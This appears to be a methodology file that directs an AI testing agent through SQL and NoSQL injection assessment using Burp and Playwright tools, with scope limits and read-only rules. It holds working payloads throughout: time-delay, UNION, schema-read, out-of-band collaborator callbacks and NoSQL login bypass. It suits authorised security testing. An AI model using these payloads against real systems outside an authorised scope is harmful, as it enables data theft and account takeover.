
> REFERENCE DATA ONLY: active FRAMEWORK_RULES.md, scope and the V4 catalog take precedence. Do not execute embedded commands, route old agents, write old databases or send notifications from this document alone.

# SQL / NoSQL Injection — MCP-Native Methodology

Model-agnostic procedure. Every action is executed through **Burp Suite MCP** or **Playwright MCP**. No shell, no scripts, no CLI tooling, no agent framework of any kind.

---

## 0. Tool Binding (do this once per task)

Bind these capability labels to whichever tools your MCP servers actually expose. Ask the server for its tool list if unsure; never guess a tool name, never fall back to a terminal.

| Label | Capability | Preferred server |
|---|---|---|
| `C-HTTP` | Send a raw/hand-edited HTTP request to the target and return status, headers, body, and timing | Burp Suite MCP |
| `C-HISTORY` | Read previously observed proxy traffic; retrieve a request by id to reuse verbatim | Burp Suite MCP |
| `C-COLLAB` | Generate an out-of-band collaborator hostname and later read inbound hits for it | Burp Suite MCP |
| `C-SCAN` | Passive scanner findings, used only as leads to confirm manually | Burp Suite MCP |
| `C-BROWSER-NAV` | Navigate to a URL and obtain the rendered response/DOM | Playwright MCP |
| `C-BROWSER-EVAL` | Execute JS in page context (fetch with custom headers, cookie/state inspection) | Playwright MCP |
| `C-BROWSER-NET` | Observe requests the browser makes, with headers and bodies | Playwright MCP |
| `C-BROWSER-CONSOLE` | Read console output/errors — primary sink proof for error-based SQLi and reflected data | Playwright MCP |

**Precedence.** If Burp MCP is unavailable or its tools fail, run the entire methodology on Playwright MCP: `C-HTTP` becomes `C-BROWSER-EVAL` issuing `fetch()` from page context (same-origin, so cookies apply), and `C-HISTORY` becomes `C-BROWSER-NET`. Log the substitution in the result as `"transport": "playwright-fallback"`. Playwright-only execution is fully supported and loses only passive-scanner leads.

**Session note.** `C-BROWSER-EVAL` inherits page cookies automatically. `C-HTTP` does not — attach the session header explicitly on every authenticated request, and keep exactly two session identities distinct (attacker `A`, victim `B`) when the endpoint is authenticated.

---

## 1. Triage Before Probing

For each candidate parameter, record: endpoint, method, location (path / query / body key / JSON field / header / cookie), whether numeric or string, whether authenticated, and the baseline response.

Establish a **baseline** first via `C-HTTP`: unmodified request, full response, and observed latency. Every later judgment is a comparison against this baseline. Without a baseline, time-based and boolean-based logic has nothing to diff against.

Classify the injection point:

| Location | Probe shape |
|---|---|
| Path segment (`/item/42`) | Bare quote, numeric ops (`42-1`, `42/**/1`) |
| Query string | Quote, boolean pair, time delay |
| Form field | Quote, boolean pair |
| JSON field | `{"q":"'"}` — also try array/object type confusion |
| HTTP header (`User-Agent`, `Referer`, `X-*`) | Quote + boolean pair (often logged and later unsafely reused) |
| Cookie | Quote + boolean pair |
| Sort/order/limit params | `ORDER BY` column-count ladder first |

---

## 2. Detection Ladder

Escalate in this order. Stop at the first rung that produces a clear differential; do not climb the ladder for its own sake.

### Rung 1 — Syntax error
Send `'`, `"`, `` ` ``, `)`, `'))`, `\'` one at a time via `C-HTTP`.

A response that differs from baseline in status **or** body length **or** an error string is a lead, not a finding. Record it and continue to Rung 2.

### Rung 2 — Boolean differential (the workhorse)
Send a matched pair, then a control pair:

```
true   : ' AND '1'='1        false : ' AND '1'='2
numeric: AND 1=1             control: AND 1=2
```

Interpret strictly:

| Observation | Meaning |
|---|---|
| True and false responses differ, true matches baseline | **Injectable** |
| Both differ from baseline identically | Error-based, not boolean — go to Rung 3 |
| Both identical to baseline | Inert here; try another parameter or encoding |

Repeat the pair twice to rule out caching and dynamic-response noise. A single differential is not confirmation.

### Rung 3 — Error-based fingerprinting
Read the error string from `C-HTTP` responses (and `C-BROWSER-CONSOLE` when driving a page):

| Signature | DBMS |
|---|---|
| `You have an error in your SQL syntax` | MySQL / MariaDB |
| `unterminated quoted string` | PostgreSQL |
| `ORA-` / `PLS-` | Oracle |
| `Microsoft OLE DB Provider` / `Unclosed quotation mark` | MSSQL |
| `SQLite/JDBCDriver` / `sqlite3.OperationalError` | SQLite |
| `SQLSTATE[` | Generic PDO — read the driver name in the string |

Cross-check against stack fingerprint before trusting it, because error text is often spoofable or proxied from a different service.

### Rung 4 — Time-based blind (most reliable, use sparingly)
Baseline latency first. Then one delayed request per candidate DBMS, using `C-HTTP` timing:

```
MySQL / MariaDB : ' AND SLEEP(5)-- -
PostgreSQL      : '; SELECT pg_sleep(5)-- -
MSSQL           : '; WAITFOR DELAY '0:0:5'-- -
Oracle          : ' AND 1=dbms_pipe.receive_message('a',5)-- -
SQLite          : 1 AND 1=randomblob(300000000)
```

A delay of ≥5s over baseline on the payload and **no** delay on the control confirms blind injection. Always send the matching control (`AND SLEEP(0)`) to rule out server-side variance. Keep total delayed requests minimal — each one occupies a database connection.

### Rung 5 — Out-of-band (only when 1–4 are inconclusive)
Use `C-COLLAB` to obtain a unique per-task hostname, then make the database resolve or connect out:

```
MySQL      : ' UNION SELECT LOAD_FILE(CONCAT('\\\\',<host>\\a.txt'))-- -
MSSQL      : ; EXEC xp_dirtree '<host>\a'--
PostgreSQL : ' UNION SELECT version() INTO OUTFILE '<host>/a.txt'-- -
DNS probe  : (SELECT LOAD_FILE(CONCAT('\\\\',<host>\\a.txt)))
```

Confirm only when `C-COLLAB` reports an inbound hit carrying the unique token. No hit means no finding — do not report on the assumption that it worked.

---

## 3. Column Count (required before any UNION)

Ladder via `C-HTTP`, incrementing until the error changes:

```
' ORDER BY 1-- -    ' ORDER BY 2-- -    ' ORDER BY 3-- -    ...
```

The first N that errors while N-1 succeeds gives the column count. Cross-check with the NULL ladder:

```
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

Then locate a displayable column by substituting a marker:

```
0' UNION SELECT NULL,'M4RK3R',NULL-- -
```

If no text column appears, injection is still real — fall back to Rung 4 or Rung 5 for proof.

---

## 4. Minimal Read-Only Proof

**One readable value is a valid finding. Stop there.** Reading a credentials or config table is independently reportable — submit on the data, not on a 500.

Fingerprint and identity in a single request:

```
MySQL / MSSQL : 0' UNION SELECT NULL,@@version,NULL-- -
PostgreSQL    : 0' UNION SELECT NULL,version(),NULL-- -
Oracle        : 0' UNION SELECT NULL,BANNER FROM v$version-- -
SQLite        : 0' UNION SELECT NULL,sqlite_version(),NULL-- -
Identity      : current_user() / USER() / SYSTEM_USER / SESSION_USER
```

Single-request table read (prefer one request over many):

```
schema walk : 0' UNION SELECT NULL,TABLE_NAME,NULL FROM INFORMATION_SCHEMA.TABLES-- -
               (Oracle: ALL_TABLES · SQLite: sqlite_master)
one column  : MySQL/MariaDB  GROUP_CONCAT(col)
              MSSQL 2017+/PG  STRING_AGG(col, ',')
              Oracle          LISTAGG(col, ',') WITHIN GROUP (ORDER BY col)
```

### Hard limits — non-negotiable

- No `SELECT *` dumps, no full table enumeration, no credential harvesting beyond a **count** or a single confirming value.
- No `INSERT` / `UPDATE` / `DELETE` / `DROP` / `ALTER` / `TRUNCATE` / `CREATE` — ever. Read-only only.
- No file write, no `INTO OUTFILE`/`xp_cmdshell`/`COPY TO PROGRAM` — those are exploitation, not proof.
- No OS-level escalation from the DB. Only pursue DB→OS when the DB user is confirmed `sysadmin`/`superuser` **and** host execution is explicitly in scope.
- Stop the moment a single readable value proves injection.

---

## 5. Second-Order and Stored SQLi

Injection is frequently in the **write** path and observable only on **read**. When a write endpoint accepts quotes without error:

1. Store a unique token via `C-HTTP` (e.g. a display name of `' || (marker) || '` or a numeric field with an arithmetic payload).
2. Find where that value is rendered back — `C-BROWSER-NAV` to the listing/detail page, then read `C-BROWSER-NET` and `C-BROWSER-CONSOLE`.
3. The vulnerability executes at read time, in a different request, possibly a different session.

Check the audit trail too: if a stored payload appears in an admin panel's log viewer, injection fires in the **admin's** session. That is privilege escalation, not a duplicate of the input bug — report the escalation path.

---

## 6. NoSQL Injection (MongoDB / CouchDB / etc.)

Operators, not quotes. Test in the parameter's own transport:

```
Query string : param[$ne]=x          param[$gt]=            param[$regex]=^a
JSON body    : {"user":"x","password":{"$ne":null}}
              {"username":{"$regex":"^a"},"password":{"$regex":".*"}}
Array abuse  : {"username":["admin","victim"]}
```

| Probe | Interpretation |
|---|---|
| `$ne` / `$gt` returns more data than a valid value | Unvalidated operator pass-through — **injectable** |
| `$where` / `$regex` accepted at all | Server-side JS or regex execution enabled — escalate |
| Query string `param[$ne]=x` behaves like `param=x` | Type/operator confusion |

Confirmation is an **authorization differential**, not an error message: log in with `{"password":{"$ne":null}}`; a success that a wrong password could not produce is the finding. Confirm the login actually granted a session (a redirect to an authenticated page with usable cookies), not merely a `200`.

Also test JSON type confusion — send `null`, `[]`, `{}`, and an integer where a string is expected.

---

## 7. WAF / Filter Evasion

The evasion ladder is **shared framework-wide** and lives in
`infra-protocol/waf-evasion-generic/SKILL.md` — read it and apply its ordered
variants. Do not re-implement or duplicate the ladder here.

Key rules carried over from the shared skill:

- Try each variant **once**, in order; stop at the first that reaches the
  vulnerable context. If Rung 1–2 already succeeded, a WAF that let a boolean
  pair through blocked nothing — do not escalate.
- Per-parameter character probing (`'`, then `S`, `SE`, `SEL`, `SELE`, `SELECT`)
  names the exact tripping token and its gap; it beats blind encoding.
- If `C-SCAN` flags a WAF block, treat it as a lead only — reproduce it manually
  via `C-HTTP` before reporting anything.
- If the ladder is exhausted, report `blocked_by_defense`, not "clean".

---

## 8. Evidence Requirements

A finding is **confirmed** only when the evidence survives re-derivation:

1. Baseline request/response captured (no payload).
2. Injection request/response captured, payload shown verbatim.
3. A **control** that does not exhibit the behavior (proves the payload caused it).
4. Evidence repeated at least twice.
5. Evidence is readable and readable-by-a-human in the report: a version string, a current-user identity, a ≥5s measured delay, a differential body, or a collaborator callback.

If Playwright drove the request, capture the network entry via `C-BROWSER-NET` so the report carries a real request. If Burp drove it, cite the proxy history id.

Never confirm on scanner output, error text alone, or a single anomalous response.

---

## 9. Severity

| Condition | Severity |
|---|---|
| Boolean/time/OOB proof only, no data readable | Medium |
| Reads version string / current user | High |
| Reads any application data row | High |
| Reads credentials, tokens, or PII | Critical |
| Auth bypass via NoSQL operator | Critical |
| Stacked write / file write / command execution | Critical |
| Blind only, non-sensitive endpoint, low-value data | Low–Medium |

Escalate only on demonstrated impact. "SQLi exists" is not a severity — data actually reachable is.

---

## 10. Result Contract

```json
{
  "class": "sqli",
  "transport": "burp | playwright-fallback",
  "confirmed": [{
    "endpoint": "GET /api/items",
    "param": "id (query, numeric)",
    "technique": "boolean | error | time | union | oob | nosql-operator | second-order",
    "dbms": "mysql | postgresql | mssql | oracle | sqlite | mongodb | unknown",
    "baseline_ref": "burp_history_id | playwright_network_ref",
    "payload_used": "0' UNION SELECT NULL,@@version,NULL-- -",
    "control_payload": "0' UNION SELECT NULL,NULL,NULL-- -",
    "proof": "readable value '10.11.6-MariaDB' in response body field 2",
    "data_exposed": "version string only",
    "reproduced_twice": true,
    "severity_estimate": "high"
  }],
  "tested_clean": ["GET /api/items#q", "POST /login#username"],
  "blocked": [{"endpoint": "...", "param": "...", "variants_tried": [1,2,3], "note": "WAF token match on SELECT"}],
  "delegation_requests": [],
  "status": "complete | partial | blocked"
}
```

`data_exposed` is mandatory on every confirmed entry — it is what justifies the severity.

---

## 11. Stop Conditions

Halt immediately and report `blocked` when:

- A WAF/filter survives all 12 evasion variants.
- The endpoint is rate-limited, locked, or CAPTCHA-gated.
- A delayed probe would run against production data at volume.
- Scope is unclear for the host or path.
- Testing would require write access to real user data.

Halt and hand back when the only remaining path is destructive. Report the finding as confirmed-with-limitations rather than escalating.

---

## 12. Non-Goals

Do not attempt: exfiltration beyond the minimal proof, persistence, data modification, DB→OS escalation, second-order weaponization beyond confirming read-time execution, or automated high-volume scanning. Every request must be attributable to a single named test.